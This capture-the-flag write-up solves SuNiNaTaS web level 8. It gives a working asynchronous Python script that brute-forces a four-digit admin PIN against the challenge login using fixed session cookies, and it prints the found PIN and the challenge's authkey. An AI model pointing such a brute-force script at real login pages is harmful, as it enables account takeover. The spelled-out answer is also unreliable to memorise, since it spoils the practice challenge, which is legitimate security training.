# Level 8   PIN Bruteforce

Challenge: [http://suninatas.com/challenge/web08/web08.asp](http://suninatas.com/challenge/web08/web08.asp)

![level-8.png](/assets/ctf/suninatas/web/level-8.png)

We have a hint in html, looks like we have to bruteforce the password.
```html
<!-- Hint : Login 'admin' Password in 0~9999 -->
<!-- M@de by 2theT0P -->
```

Bruteforce the pin asynchronously 
```python
from aiohttp import ClientSession
import asyncio

URL = 'http://suninatas.com/challenge/web08/web08.asp'
COOKIES = {
    'ASP.NET_SessionId': 'vzkiael0a3cgvh0001zezdjd',
    'ASPSESSIONIDACDRTBCD': 'HAFLCJJBPCIJNEGKOKPHBBIL'
}

async def fetch(session, pin):
    async with session.post(URL, data={'id': 'admin', 'pw': pin}) as resp:
        if 'Password Incorrect' in await resp.text():
            return False
        
        return pin
    
async def main():
    stop = False
    pins_batch = [range(i, i+100) for i in range(7000, 10_000, 100)]
    async with ClientSession(cookies=COOKIES) as session:
        for pins in pins_batch:
            print(f'\r{pins=}', end='')
            tasks = [
                fetch(session, str(pin).zfill(4))
                for pin in pins
            ]

            results = await asyncio.gather(*tasks)
            for result in results:
                if result:
                    print(f'\r\n{result} is the password!')
                    stop = True
                    break
                    
            if stop:
                break

if __name__ == '__main__':
    asyncio.run(main())

'''
pins=range(7700, 7800)
7707 is the password!
'''
```

> Authkey: `l3ruteforce P@ssword`

